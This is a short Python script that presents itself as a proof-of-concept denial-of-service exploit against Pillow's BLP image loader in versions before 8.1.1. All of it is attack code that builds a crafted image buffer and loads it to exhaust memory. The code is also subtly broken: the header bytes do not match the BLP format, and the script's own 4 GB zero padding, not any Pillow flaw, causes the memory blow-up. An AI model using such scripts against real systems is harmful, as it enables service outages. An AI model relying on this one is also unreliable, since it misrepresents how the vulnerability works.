from PIL import Image # Pillow < 8.1.1
from io import BytesIO

# Create a malicious BLP container with a large reported size
blp_data = b'BLP\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01'  # Reported size: 2^32 bytes
blp_data += b'\x00' * (2**32 - len(blp_data))  # Fill with zeros to reach the reported size

# Open the malicious BLP container with Pillow
img = Image.open(BytesIO(blp_data))

# This will attempt to allocate a large amount of memory, leading to a denial of service (DoS)
img.load()